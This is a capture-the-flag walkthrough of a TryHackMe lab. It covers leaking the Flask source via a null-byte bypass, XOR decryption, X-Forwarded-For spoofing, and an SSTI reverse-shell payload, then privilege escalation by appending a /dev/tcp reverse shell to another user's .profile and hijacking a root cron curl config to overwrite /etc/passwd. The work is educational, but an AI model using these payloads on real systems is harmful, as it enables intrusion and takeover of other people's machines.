---
title: Super-Secret-TIp @ THM
date: 2023-9-27 14:19:55 +0100
categories: [Machines, THM]
tags: [Source Code, Fuzzing, SSTI]
math: true
mermaid: true
media_subpath: /assets/posts/2023-9-27-THM-Super-Secret-TIp
image:
  path: preview.jpeg
---


# Super Secret TIp

![3c5a447995f6d7d551327537bbc161ad](https://github.com/7h30ry/writeups/assets/51336409/28c8be46-6d6c-4fcc-895a-0df44eb395ae)

## Port Scan

![Screenshot from 2023-09-27 12-07-42](https://github.com/7h30ry/writeups/assets/51336409/6cb8c24a-f672-4a3f-a712-cb801b35a278)

We have port 22 and 7777 open i navigete to port 7777 on the browser

Port 7777

![Screenshot from 2023-09-27 12-09-21](https://github.com/7h30ry/writeups/assets/51336409/0f8e09e4-876d-45b1-9cb3-5f5d8eed9d32)

We see that it is a web page
so i decided to do some directory
```
gobuster dir -u http://10.10.5.80:7777/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 50 --no-error
```

![Screenshot from 2023-09-27 12-10-55](https://github.com/7h30ry/writeups/assets/51336409/fa3771f1-635d-4160-a4bc-eecc39283dd9)

Two directories found
```
/cloud                (Status: 200) [Size: 2991]
/debug                (Status: 200) [Size: 1957]
```
Checking ```http://10.10.5.80:7777/debug``` first

![Screenshot from 2023-09-27 12-14-34](https://github.com/7h30ry/writeups/assets/51336409/63893db1-4ca6-463c-8ad4-d624b09bd354)

okay, not sure what is this yet but let's try giving it random input :

![Screenshot from 2023-09-27 12-15-41](https://github.com/7h30ry/writeups/assets/51336409/da9a9def-88e6-466f-bb5d-b36f72eba609)

we see that it requires a password, but we don't have one, so let's move on to  ```http://10.10.5.80:7777/cloud``` :

![Screenshot from 2023-09-27 12-16-59](https://github.com/7h30ry/writeups/assets/51336409/dfa80696-5129-4e3b-b869-daeef0212d91)

While trying to download the files the first 3 files and the last one, with the others we get 404 Not Found.
I checked out the files i was able to download but nothing in them
Later on i notice that the webserver is  Werkzeug/2.3.4 Python/3.11.0, so it's probably running Flask.

Trying to see if i can download any other app

```
wfuzz -u http://10.10.5.80:7777/cloud -X POST -d 'download=FUZZ.py' -w /usr/share/seclists/Discovery/Web-Content/common.txt --hc 404

********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.5.80:7777/cloud
Total requests: 4715

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                
=====================================================================

000003874:   200        86 L     250 W      2898 Ch     "source"

```

we got a response for source, let's try downloading source.py :

```
curl http://10.10.5.80:7777/cloud -X POST -d 'download=source.py'
```
```python
from flask import *
import hashlib
import os
import ip # from .
import debugpassword # from .
import pwn

app = Flask(__name__)
app.secret_key = os.urandom(32)
password = str(open('supersecrettip.txt').readline().strip())

def illegal_chars_check(input):
    illegal = "'&;%"
    error = ""
    if any(char in illegal for char in input):
        error = "Illegal characters found!"
        return True, error
    else:
        return False, error

@app.route("/cloud", methods=["GET", "POST"]) 
def download():
    if request.method == "GET":
        return render_template('cloud.html')
    else:
        download = request.form['download']
        if download == 'source.py':
            return send_file('./source.py', as_attachment=True)
        if download[-4:] == '.txt':
            print('download: ' + download)
            return send_from_directory(app.root_path, download, as_attachment=True)
        else:
            return send_from_directory(app.root_path + "/cloud", download, as_attachment=True)
            # return render_template('cloud.html', msg="Network error occurred")

@app.route("/debug", methods=["GET"]) 
def debug():
    debug = request.args.get('debug')
    user_password = request.args.get('password')
    
    if not user_password or not debug:
        return render_template("debug.html")
    result, error = illegal_chars_check(debug)
    if result is True:
        return render_template("debug.html", error=error)

    # I am not very eXperienced with encryptiOns, so heRe you go!
    encrypted_pass = str(debugpassword.get_encrypted(user_password))
    if encrypted_pass != password:
        return render_template("debug.html", error="Wrong password.")
    
    
    session['debug'] = debug
    session['password'] = encrypted_pass
        
    return render_template("debug.html", result="Debug statement executed.")

@app.route("/debugresult", methods=["GET"]) 
def debugResult():
    if not ip.checkIP(request):
        return abort(401, "Everything made in home, we don't like intruders.")
    
    if not session:
        return render_template("debugresult.html")
    
    debug = session.get('debug')
    result, error = illegal_chars_check(debug)
    if result is True:
        return render_template("debugresult.html", error=error)
    user_password = session.get('password')
    
    if not debug and not user_password:
        return render_template("debugresult.html")
        
    # return render_template("debugresult.html", debug=debug, success=True)
    
    # TESTING -- DON'T FORGET TO REMOVE FOR SECURITY REASONS
    template = open('./templates/debugresult.html').read()
    return render_template_string(template.replace('DEBUG_HERE', debug), success=True, error="")

@app.route("/", methods=["GET"])
def index():
    return render_template('index.html')

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=7777, debug=False)
```

and we got the applications source code, let's start analyzing it.

so first we notice that it's grabbing the password from supersecrettip.txt, let's read that file :

```
curl http://10.10.5.80:7777/cloud -X POST -d 'download=supersecrettip.txt'
b' \x00\x00\x00\x00%\x1c\r\x03\x18\x06\x1e'
```
we got some bytes, which suggests that this is encrypted, let's find out with what is encrypted.

we notice this in the debug function :

```python
# I am not very eXperienced with encryptiOns, so heRe you go!
  encrypted_pass = str(debugpassword.get_encrypted(user_password))
  if encrypted_pass != password:
      return render_template("debug.html", error="Wrong password.")
```
first from the comment if we look closely we can notice the capital letters X & O & R, which suggests that the password is XORed, and in order for us to be able to decode it we need to find the key with which it was XORed.

and that key is probably in debugpassword.py which was imported in the beginning import debugpassword # from ., cause we see that it's encrypting the password that we provide and compares that with the encrypted password in supersecrettip.txt.

but we can't get what's in debugpassword.py that easy cause as we can see in the download function :

```python
def download():
    if request.method == "GET":
        return render_template('cloud.html')
    else:
        download = request.form['download']
        if download == 'source.py':
            return send_file('./source.py', as_attachment=True)
        if download[-4:] == '.txt':
            print('download: ' + download)
            return send_from_directory(app.root_path, download, as_attachment=True)
        else:
            return send_from_directory(app.root_path + "/cloud", download, as_attachment=True)
            # return render_template('cloud.html', msg="Network error occurred")
```
we are only allowed to grab source.py or any file that ends with .txt.

after some time i got an idea to how to bypass that, which is similar to a file upload filter bypassing method, which is using the null byte, basically we will provide this as the file name : debugpassword.py%00.txt, we see that it's still ending with .txt which bypasses that check, and will be able to grab the python file :

```
curl http://10.10.5.80:7777/cloud -X POST -d 'download=debugpassword.py%00.txt'
```
```python
import pwn

def get_encrypted(passwd):
    return pwn.xor(bytes(passwd, 'utf-8'), b'[REDACTED])
```
and we successfully bypassed that filter and we got the source code of debugpassword.py.

and we see the key with which the encrypted password is XORed, since now we have the key, we can decrypt it, let's use python

```python
def xor_decrypt(ciphertext, key):
    decrypted_message = bytearray()
    for i in range(len(ciphertext)):
        decrypted_byte = ciphertext[i] ^ ord(key[i % len(key)])
        decrypted_message.append(decrypted_byte)
    return decrypted_message

encrypted = b' \x00\x00\x00\x00%\x1c\r\x03\x18\x06\x1e'
key = "[REDACTED]"
decrypted_bytes = xor_decrypt(encrypted, key)
decrypted_message = decrypted_bytes.decode('utf-8')
print("Decrypted message:", decrypted_message)
```
now let's run it and decrypt the password :

```
Decrypted message: [REDACTED]
```
and now we have the password, let's return to the debug page and provide it the password

![Screenshot from 2023-09-27 12-40-59](https://github.com/7h30ry/writeups/assets/51336409/ec33d049-f3fb-4ba1-94cd-fa776c078205)

and the password is correct and we were able to execute the debug statement.

now let's see in the source code how to see the result of that debug statement

```python
@app.route("/debugresult", methods=["GET"])
def debugResult():
    if not ip.checkIP(request):
        return abort(401, "Everything made in home, we don't like intruders.")

    if not session:
        return render_template("debugresult.html")

    debug = session.get('debug')
    result, error = illegal_chars_check(debug)
    if result is True:
        return render_template("debugresult.html", error=error)
    user_password = session.get('password')

    if not debug and not user_password:
        return render_template("debugresult.html")

    # return render_template("debugresult.html", debug=debug, success=True)

    # TESTING -- DON'T FORGET TO REMOVE FOR SECURITY REASONS
    template = open('./templates/debugresult.html').read()
    return render_template_string(template.replace('DEBUG_HERE', debug), success=True, error="")
```

okey, so first before accessing the page, the code performs some checks.

first if the IP Check fails we get 401 Unauthorized, since we can read source code files, let's see what's in the imported module ip

```
curl http://10.10.5.80:7777/cloud -X POST -d 'download=ip.py%00.txt'
```
```python
host_ip = "127.0.0.1"
def checkIP(req):
    try:
        return req.headers.getlist("X-Forwarded-For")[0] == host_ip
    except:
        return req.remote_addr == host_ip
```
okey so to bypass that we just need to add this header to the request : X-Forwarded-For: 127.0.0.1.

second we need the session, and in order to get the session we need to execute the debug statement with the correct password which we already have, let's execute it again and get the session cookie to include it in the request for /debugresult :

```
curl 'http://10.10.5.80:7777/debug?debug=7*7&password=[REDACTED]' -I
```
```
HTTP/1.1 200 OK
Server: Werkzeug/2.3.4 Python/3.11.0
Date: Wed, 27 Sep 2023 11:44:33 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 2024
Vary: Cookie
Set-Cookie: session=.eJyrVkpJTSpNV7JSMtcyV9JRKkgsLi..[REDACTED]; HttpOnly; Path=/
Connection: close
```
and we got the session cookie now let's add all things together and access the result page :

```
curl 'http://10.10.5.80:7777/debugresult' -H 'X-Forwarded-For: 127.0.0.1' -b 'session=eJyrVkpJTSpNV7JSMtc[REDACTED]'
```

we finally got access to the debugResult page and we see that our input from the debug statement is reflected on the page, and since this is running flask, that makes it vulnerable to Server Side Template Injection, to confirm that, let's create another debug statement with the value {{7*7}}, and see if it will execute, if we get the output as 49, we will know for sure that it's vulnerable

```
curl 'http://10.10.5.80:7777/debug?debug=\{\{7*7\}\}&password=[REDACTED]' -I
```
```
debugging
<span class="result">49</span>

</code>
</pre>
```
we got 49, that confirms that it's vulnerable to ssti, now let's get a reverse shell since we can execute commands with ssti.

the payload i'll use for the reverse shell is :
```
{ {config.__class__.__init__.__globals__["os"].popen("bash -c \"bash -i >" + config.__class__.__init__.__globals__["__builtins__"]["chr"](38) + " /dev/tcp/IP/PORT 0>" + config.__class__.__init__.__globals__["__builtins__"]["chr"](38) + "1\"")}}
```
Using this and the password on the debug page should get you a revesre shell
It should say Executed, once then you have to open /debugresult in order to make that payload actually run, as /debug only caches it in session.

After puting the payload and paswword and pressing the debug button
Copy your cookie
To execute the payload
```
 curl 'http://10.10.5.80:7777/debugresult' -H 'X-Forwarded-For: 127.0.0.1' -b 'session=.eJytkMEKwjAMhl-lBGQbarsxke[REDACTED]
```

```
nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.8.18.3] from (UNKNOWN) [10.10.5.80] 36364
bash: cannot set terminal process group (14): Inappropriate ioctl for device
bash: no job control in this shell
ayham@482cbf2305ae:/app$ id
id
uid=1000(ayham) gid=1000(ayham) groups=1000(ayham)
```

Going to ayham home directtory you will find the first flag

## Privilege escalation

after some basic enumeration, i decided to run linpeas.sh, and noticed something interesting in the output 

```
╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files
/dev/mqueue
/dev/shm
/home/F30s/.profile
/home/ayham
/run/lock
/tmp
/tmp/linpeas.sh
/var/tmp
```
we see that we can write into the /home/F30s/.profile file.

the .profile file is executed whenever a user (F30s in this case) logs into their account, since we have write access to it let's add a reverse shell inside and wait hoping F30s will login and the profile file will get executed
```
ayham@482cbf2305ae:/tmp$ echo 'bash -c "bash -i >& /dev/tcp/10.6.75.26/5555 0>&1"' >> /home/F30s/.profile
```
Waiting a bit

```
nc -lnvp 5555 
listening on [any] 5555 ...
connect to [10.8.18.3] from (UNKNOWN) [10.10.5.80] 54292
bash: cannot set terminal process group (8976): Inappropriate ioctl for device
bash: no job control in this shell
F30s@482cbf2305ae:~$
```
and we got a shell as F30s.

i decided to run pspy64 to see live running processes, and noticed an interesting process

```
CMD: UID=0     PID=298    | /bin/sh -c    curl -K /home/F30s/site_check
```
so root is executing curl -K /home/F30s/site_check, let's check the site_check file

```
F30s@482cbf2305ae:~$ cat site_check
url = "http://127.0.0.1/health_check"
```

so this is a curl config file, basically instead of specifying arguments in the terminal, we can just add them to this config file, and we see that the url is http://127.0.0.1/health_check, i tried to access that but got no connection.

but since we can modify this file, we can modify the url to some file that we control and add another argument which is output, to right the content of the url to that output file.

let's first test this, so in my local machine, i create a simple text file and opened an http server 

On your local machine
```
echo 'root1::0:0:root1:/home/root1:/bin/bash' >> passwd
python3 -m http.server 80
```
then i modified the curl config file to i.e the site_check

```
url = "http://10.8.18.3/passwd"
output = "/etc/passwd"
```
then we start the http server, after a while i got the request, so i tried to login to the new user i created :
```
F30s@482cbf2305ae:~$ su root1
root@482cbf2305ae:/home/F30s# cd /root
root@482cbf2305ae:/root# whoami
root
root@482cbf2305ae:/root# id
uid=0(root) gid=0(root) groups=0(root)
```

## Reading the root flag

```
root@482cbf2305ae:/root# ls
flag2.txt  secret.txt
root@482cbf2305ae:/root# cat flag2.txt
b'ey}BQB_^[\\ZEnw\x01uWoY~aF\x0fiRdbum\x04BUn\x06[\x02CHonZ\x03~or\x03UT\x00_\x03]mD\x00W\x02gpScL'
root@482cbf2305ae:/root# cat secret.txt
b'C^_M@__DC\\7,'
```
we see that the flag is somehow encrypted again, and there is another file named secret.txt and that's also looks encrypted.

i tried to decrypt them using XOR and the key we found earlier but that didn't work.

after some time we notice this text file in / :

```
root@482cbf2305ae:/# ls -la
total 92
...
drwxr-xr-x   1 root root 4096 Jun 24 14:14 run
drwxr-xr-x   1 root root 4096 Nov 15  2022 sbin
-rw-r--r--   1 root root  629 May 19 12:28 secret-tip.txt
drwxr-xr-x   2 root root 4096 Nov 14  2022 srv
dr-xr-xr-x  13 root root    0 Sep 24 14:33 sys
```
let's read it 
```
A wise *gpt* once said ...
In the depths of a hidden vault, the mastermind discovered that vital ▒▒▒▒▒ of their secret ▒▒▒▒▒▒ had vanished without a trace. They knew their ▒▒▒▒▒▒▒ was now vulnerable to disruption, setting in motion a desperate race against time to recover the missing ▒▒▒▒▒▒ before their ▒▒▒▒▒▒▒ unraveled before their eyes.
So, I was missing 2 .. hmm .. what were they called? ... I actually forgot, anyways I need to remember them, they're important. The past/back/before/not after actually matters, follow it!
Don't forget it's always about root!
```
Remember secret-tip.txt? that for our secret.txt, it mentions the following Don't forget it's always about root! so at first we can try root as the XOR key for secret.txt or flag2.txt, well flag2.txt didn't work using that key so we try on secret.txt

```
$ python
>>> import pwn; pwn.xor(b'C^_M@__DC\\7,', b'root') # b'1109200013XX' -> 1109200013XX
```
A simple python code or cyberchef can get this probably


To get the last two digits
make a word list of combinations

```
#!/bin/bash

original_string="1109200013XX"

for num in {00..99}; do
    replaced_string="${original_string/XX/$num}"
    echo "$replaced_string"
done
```
let's run it :
```
bash combinations.sh
110920001300
110920001301
110920001302
110920001303
110920001304
...
110920001395
110920001396
110920001397
110920001398
110920001399
```
good, now we replace our old wordlist with this new one, and add the flag to the decryption script and let's try to decrypt it

```
bash combinations.sh > wordlist.txt
```

```
nano decrypt.py
```

```python
def xor_decrypt(ciphertext, key):
    decrypted = bytearray(len(ciphertext))
    for i in range(len(ciphertext)):
        decrypted[i] = ciphertext[i] ^ key[i % len(key)]
    return decrypted

def main():
    ciphertext = bytearray(b'ey}BQB_^[\\ZEnw\x01uWoY~aF\x0f[REDACTED]')

    with open('wordlist.txt', 'r') as key_file:
        keys = [line.strip() for line in key_file]

    for key in keys:
        key_bytes = bytearray(key.encode())
        decrypted = xor_decrypt(ciphertext, key_bytes)

        if all(32 <= byte <= 126 for byte in decrypted):
            print(f"Key: '{key}', Decrypted Text: '{decrypted.decode()}'")

if __name__ == "__main__":
    main()
```

```
python3 decrypt.py
...
Key: '1109200013[REDACTED]', Decrypted Text: 'THM{cronjobs_[REDACTED]_t0g3THeR}'
...
```


